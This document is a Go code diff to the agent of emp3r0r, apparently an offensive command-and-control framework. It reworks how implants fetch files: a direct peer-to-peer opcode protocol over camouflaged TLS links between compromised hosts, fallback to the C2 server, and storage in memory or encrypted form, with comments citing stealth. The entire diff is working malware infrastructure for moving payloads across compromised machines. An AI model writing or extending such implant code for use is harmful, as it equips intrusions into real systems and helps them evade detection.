@@ -4,57 +4,51 @@ import (
 	"bytes"
 	"compress/gzip"
 	"context"
+	"encoding/binary"
 	"fmt"
 	"io"
-	"net/http"
 	"net/url"
 	"os"
-	"path/filepath"
 	"strings"
 	"sync"
 	"time"
 
 	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 
-	"github.com/cavaliergopher/grab/v3"
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
 	"github.com/jm33-m0/emp3r0r/core/internal/def"
 	"github.com/jm33-m0/emp3r0r/core/internal/transport"
 	"github.com/jm33-m0/emp3r0r/core/lib/crypto"
-	"github.com/jm33-m0/emp3r0r/core/lib/netutil"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
 
-// FetchFile download via grab, if path is empty, return []byte instead
+// FetchFile download via P2P mesh transfer, if path is empty, return []byte instead
 // This will try to download from other agents for better speed and stealth
-// when fail, will try to download from CC
-func FetchFile(config *def.Config, download_addr, file_to_download, path, checksum string) (data []byte, err error) {
+// when fail, will automatically fall back to downloading from CC
+func FetchFile(config *def.Config, peer, file_to_download, path, checksum string) (data []byte, err error) {
 	if util.IsFileExist(path) {
 		// check checksum
 		data, err = util.ReadFileAgent(path)
 		if err == nil {
-			if crypto.SHA256SumRaw(data) == checksum {
+			if checksum == "" || crypto.SHA256SumRaw(data) == checksum {
 				logging.Infof("FetchFile: %s already exists and checksum matches", path)
-				return data, err
+				return data, nil
 			}
 		}
 	}
 
-	// if download_host is given, download from the specified agent
-	if download_addr != "" {
-		// download from other agent
-		logging.Infof("FetchFile: downloading from %s", download_addr)
-		err = FetchFileKCP(download_addr, file_to_download, path, checksum)
-		if util.IsFileExist(path) {
-			// checksum
-			data, err = util.ReadFileAgent(path)
-			if err == nil && crypto.SHA256SumRaw(data) == checksum {
-				logging.Infof("FetchFile: %s downloaded via TCP and checksum matches", path)
-			}
+	// if peer is given, try P2P mesh transfer from peer agent first
+	if peer != "" {
+		logging.Infof("FetchFile: attempting P2P download of %s from peer %s", file_to_download, peer)
+		data, err = FetchFilePeer(peer, file_to_download, path, checksum)
+		if err == nil {
+			logging.Infof("FetchFile: successfully downloaded %s from peer %s over P2P mesh", file_to_download, peer)
+			return data, nil
 		}
-		return nil, err
+		logging.Warningf("FetchFile: P2P download from %s failed (%v), falling back to C2 server", peer, err)
 	}
 
+	// Fallback to C2 server
 	return DownloadViaC2(config, file_to_download, path, checksum)
 }
 
@@ -70,14 +64,13 @@ func DownloadViaC2(config *def.Config, file_to_download, path, checksum string) 
 		retData = true
 		logging.Infof("No path specified, will return []byte")
 	}
-	lock := fmt.Sprintf("%s.lock", path)
-	if util.IsFileExist(lock) {
-		err = fmt.Errorf("%s already being downloaded", downloadURL)
-		return data, err
-	}
-
-	// create file.lock to prevent racing downloads
-	if !retData {
+	// For non-mem paths, use a lock file to prevent racing downloads
+	if !retData && !strings.HasPrefix(path, "mem:") {
+		lock := fmt.Sprintf("%s.lock", path)
+		if util.IsFileExist(lock) {
+			err = fmt.Errorf("%s already being downloaded", downloadURL)
+			return data, err
+		}
 		util.CreateFileAgent(lock)
 		defer os.RemoveAll(lock)
 	}
@@ -107,30 +100,24 @@ func DownloadViaC2(config *def.Config, file_to_download, path, checksum string) 
 		return data, nil
 	}
 
-	// download to file
+	// download to file (or memfs)
 	logging.Infof("Downloading %s to %s", file_to_download, path)
-	f, err := os.OpenFile(path, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0o600)
-	if err != nil {
-		err = fmt.Errorf("DownloadViaC2 create file: %v", err)
-		return data, err
-	}
-	defer f.Close()
 
-	// Use a 1MB buffer to optimize throughput and reduce polling overhead (especially for the http_poll transport)
-	copyBuf := make([]byte, 1024*1024)
-	_, err = io.CopyBuffer(f, secureConn, copyBuf)
+	// Always read into memory first — this correctly handles both mem: and disk paths
+	// via WriteFileAgent, avoiding any direct os.OpenFile on mem:/// paths.
+	data, err = io.ReadAll(secureConn)
 	if err != nil {
-		err = fmt.Errorf("DownloadViaC2 io.Copy: %v", err)
-		return data, err
+		return nil, fmt.Errorf("DownloadViaC2 read: %v", err)
 	}
 
-	// checksum
 	if checksum != "" {
-		c := crypto.SHA256SumFile(path)
-		if c != checksum {
-			err = fmt.Errorf("DownloadViaC2 checksum failed: %s != %s", c, checksum)
-			return nil, err
+		if c := crypto.SHA256SumRaw(data); c != checksum {
+			return nil, fmt.Errorf("DownloadViaC2 checksum failed: %s != %s", c, checksum)
 		}
+	}
+
+	if err = util.WriteFileAgent(path, data, 0o600); err != nil {
+		return nil, fmt.Errorf("DownloadViaC2 write: %v", err)
 	}
 
 	return nil, nil
@@ -185,163 +172,101 @@ func SendFile2CC(filepath string, offset int64, token string) (err error) {
 var AgentFileTransferSessions sync.Map
 
 var (
-	// FileServer switch
+	// FileServer switch (kept for API compat, file serving is now done in mesh/bridge.go)
 	FileServerCtx    context.Context
 	FileServerCancel context.CancelFunc
 )
 
-// FileServer hosts files on an HTTP server over P2P mesh transport
-func FileServer(port int, ctx context.Context, cancel context.CancelFunc) (err error) {
-	defer cancel()
+// FetchFilePeer downloads a file directly from a peer agent using the existing
+// P2P relay transport (OpcodeFileRequest on KCPServerPort). No tunnel, no HTTP.
+// Returns the file bytes, saving them to path if non-empty.
+func FetchFilePeer(peerIP, file_to_download, path, checksum string) (data []byte, err error) {
+	addr := fmt.Sprintf("%s:%s", peerIP, common.RuntimeConfig.KCPServerPort)
 
-	// start HTTP server on local interface on a random port
-	http_port := util.RandInt(10000, 60000)
-	listen_addr := fmt.Sprintf("127.0.0.1:%d", http_port)
-	http.HandleFunc("/", handleClient)
-	server := &http.Server{Addr: listen_addr}
-
-	// start P2P tunnel server using P2P mesh transport that forwards to HTTP server
-	portstr := fmt.Sprintf("%d", port)
-	go transport.P2PTunServer(listen_addr, portstr, common.RuntimeConfig.Password, def.MagicString, common.RuntimeConfig.P2PTransport, common.RuntimeConfig.CamouflageCertOrg, common.RuntimeConfig.CamouflageCertCN, ctx, cancel)
-
-	go func() {
-		defer func() {
-			if r := recover(); r != nil {
-				logging.Errorf("FileServer panic: %v\n%s", r, util.CallStack())
-			}
-		}()
-		<-ctx.Done()
-		server.Close()
-	}()
-
-	logging.Infof("HTTP secure file server started on port %d using %s P2P transport", port, common.RuntimeConfig.P2PTransport)
-	err = server.ListenAndServe()
-	if err != nil && err != http.ErrServerClosed {
-		return fmt.Errorf("FileServer: failed to start HTTP server: %v", err)
+	// Dial using the same transport that ServeRelay uses
+	t := transport.GetTransportImplementation(common.RuntimeConfig.P2PTransport)
+	if t == nil {
+		return nil, fmt.Errorf("FetchFilePeer: transport %q not found", common.RuntimeConfig.P2PTransport)
 	}
-	logging.Infof("FileServer on %d exited", port)
-	return nil
-}
-
-func handleClient(w http.ResponseWriter, r *http.Request) {
-	file_path := r.URL.Query().Get("file_path")
-	checksum := r.URL.Query().Get("checksum")
-
-	if file_path == "" {
-		http.Error(w, "Invalid file path", http.StatusBadRequest)
-		return
+	if camo, ok := t.(*transport.CamouflageMTLS); ok {
+		camo.CertOrg = common.RuntimeConfig.CamouflageCertOrg
+		camo.CertCN = common.RuntimeConfig.CamouflageCertCN
 	}
 
-	var target_path string
-
-	if strings.HasPrefix(file_path, "mem://") {
-		// Memory filesystem path
-		if !util.IsFileExist(file_path) {
-			http.Error(w, "File not found", http.StatusNotFound)
-			return
-		}
-		target_path = file_path
-	} else {
-		// Disk file path: enforce strict basename/locality to prevent traversal
-		if filepath.IsAbs(file_path) || strings.Contains(file_path, "..") {
-			http.Error(w, "Invalid file path", http.StatusBadRequest)
-			return
-		}
-		basename := util.FileBaseName(file_path)
-		if basename == "" {
-			http.Error(w, "Invalid file path", http.StatusBadRequest)
-			return
-		}
-		safe_path := filepath.Join(os.TempDir(), basename)
-
-		if !util.IsFileExist(safe_path) {
-			logging.Infof("handleClient: file %s (%s) does not exist on disk, downloading from C2", safe_path, checksum)
-			_, err := DownloadViaC2(common.RuntimeConfig, file_path, safe_path, checksum)
-			if err != nil {
-				logging.Infof("handleClient: failed to download file from C2: %v", err)
-				http.Error(w, "Failed to download file from C2", http.StatusInternalServerError)
-				return
-			}
-		}
-		target_path = safe_path
-	}
-
-	// Read file content using ReadFileAgent (handles memfs and encrypted storage)
-	data, err := util.ReadFileAgent(target_path)
+	conn, err := t.Dial(addr, common.RuntimeConfig.Password, def.MagicString)
 	if err != nil {
-		logging.Infof("handleClient: failed to read file %s: %v", target_path, err)
-		http.Error(w, "Failed to read file", http.StatusInternalServerError)
-		return
+		return nil, fmt.Errorf("FetchFilePeer dial %s: %v", addr, err)
+	}
+	defer conn.Close()
+
+	// Send opcode
+	if _, err = conn.Write([]byte{0x03}); err != nil { // OpcodeFileRequest
+		return nil, fmt.Errorf("FetchFilePeer send opcode: %v", err)
 	}
 
-	// Serve file content
-	http.ServeContent(w, r, util.FileBaseName(target_path), time.Now(), bytes.NewReader(data))
-}
-
-// FetchFileKCP requests and downloads a file from a P2P server to a specified path via P2P mesh transport
-func FetchFileKCP(address, filepath, path, checksum string) (err error) {
-	ctx, cancel := context.WithCancel(context.Background())
-	defer cancel()
-
-	// start local P2P client tunnel to connect to P2P server then HTTP server
-	p2p_listen_port := fmt.Sprintf("%d", util.RandInt(10000, 50000))
-	go transport.P2PTunClient(address, p2p_listen_port, common.RuntimeConfig.Password, def.MagicString, common.RuntimeConfig.P2PTransport, common.RuntimeConfig.CamouflageCertOrg, common.RuntimeConfig.CamouflageCertCN, ctx, cancel)
-
-	// wait until port is open
-	for !netutil.IsPortOpen("127.0.0.1", p2p_listen_port) {
-		logging.Infof("RequestAndDownloadFile: waiting for port %s to open", p2p_listen_port)
-		time.Sleep(time.Second)
+	// Send 4-byte LE filename length + filename
+	name := []byte(file_to_download)
+	lenBuf := make([]byte, 4)
+	binary.LittleEndian.PutUint32(lenBuf, uint32(len(name)))
+	if _, err = conn.Write(lenBuf); err != nil {
+		return nil, fmt.Errorf("FetchFilePeer send name len: %v", err)
+	}
+	if _, err = conn.Write(name); err != nil {
+		return nil, fmt.Errorf("FetchFilePeer send name: %v", err)
 	}
 
-	// use grab to download to a temporary disk path first
-	tempFile := fmt.Sprintf("%s/emp3r0r_dl_%d", os.TempDir(), util.RandInt(10000, 99999))
-	defer os.Remove(tempFile)
-
-	client := grab.NewClient()
-	req, err := grab.NewRequest(tempFile, fmt.Sprintf("http://127.0.0.1:%s/?file_path=%s&checksum=%s", p2p_listen_port, url.QueryEscape(filepath), url.QueryEscape(checksum)))
-	if err != nil {
-		return fmt.Errorf("RequestAndDownloadFile: failed to create grab request: %v", err)
+	// Read response byte
+	conn.SetDeadline(time.Now().Add(30 * time.Second))
+	resp := make([]byte, 1)
+	if _, err = io.ReadFull(conn, resp); err != nil {
+		return nil, fmt.Errorf("FetchFilePeer read response: %v", err)
 	}
-	resp := client.Do(req)
 
-	// progress
-	t := time.NewTicker(5 * time.Second)
-	defer t.Stop()
-	for !resp.IsComplete() {
-		select {
-		case <-resp.Done:
-			err = resp.Err()
-			if err != nil {
-				return fmt.Errorf("RequestAndDownloadFile: download finished with error: %v", err)
-			}
+	if resp[0] == 0xFF { // OpcodeErr
+		errLenBuf := make([]byte, 2)
+		io.ReadFull(conn, errLenBuf)
+		msgLen := binary.LittleEndian.Uint16(errLenBuf)
+		msg := make([]byte, msgLen)
+		io.ReadFull(conn, msg)
+		return nil, fmt.Errorf("FetchFilePeer: peer error: %s", string(msg))
+	}
+	if resp[0] != 0x00 { // OpcodeOK
+		return nil, fmt.Errorf("FetchFilePeer: unexpected response 0x%02x", resp[0])
+	}
 
-			// if checksum is given, check it
-			if checksum != "" {
-				if checksum != crypto.SHA256SumFile(tempFile) {
-					return fmt.Errorf("RequestAndDownloadFile: checksum failed: %s != %s", crypto.SHA256SumFile(tempFile), checksum)
-				}
-			}
+	// Read 4-byte LE data length
+	dataLenBuf := make([]byte, 4)
+	if _, err = io.ReadFull(conn, dataLenBuf); err != nil {
+		return nil, fmt.Errorf("FetchFilePeer read data len: %v", err)
+	}
+	dataLen := binary.LittleEndian.Uint32(dataLenBuf)
+	conn.SetDeadline(time.Now().Add(5 * time.Minute)) // generous for large files
 
-			// Read downloaded data from temp file
-			data, err := os.ReadFile(tempFile)
-			if err != nil {
-				return fmt.Errorf("RequestAndDownloadFile read downloaded bytes: %v", err)
-			}
+	// Read all data
+	data = make([]byte, dataLen)
+	if _, err = io.ReadFull(conn, data); err != nil {
+		return nil, fmt.Errorf("FetchFilePeer read data: %v", err)
+	}
+	conn.SetDeadline(time.Time{})
 
-			// Save via WriteFileAgent to support mem:/// and encrypted disk storage
-			err = util.WriteFileAgent(path, data, 0o600)
-			if err != nil {
-				return fmt.Errorf("RequestAndDownloadFile write via WriteFileAgent: %v", err)
-			}
-
-			logging.Infof("RequestAndDownloadFile: saved %s to %s (%d bytes)", filepath, path, len(data))
-			return nil
-		case <-t.C:
-			logging.Infof("%.02f%% complete at %.02f KB/s", resp.Progress()*100, resp.BytesPerSecond()/1024)
+	// Verify checksum
+	if checksum != "" {
+		if c := crypto.SHA256SumRaw(data); c != checksum {
+			return nil, fmt.Errorf("FetchFilePeer checksum mismatch: got %s want %s", c, checksum)
 		}
 	}
 
-	return nil
+	logging.Infof("FetchFilePeer: got %d bytes of %s from %s", dataLen, file_to_download, peerIP)
+
+	// Save to path if requested
+	if path != "" {
+		if err = util.WriteFileAgent(path, data, 0o600); err != nil {
+			return nil, fmt.Errorf("FetchFilePeer write: %v", err)
+		}
+		logging.Infof("FetchFilePeer: saved %s to %s", file_to_download, path)
+		return nil, nil
+	}
+	return data, nil
 }
 
 // CancelFileTransfer cancels an ongoing file transfer session
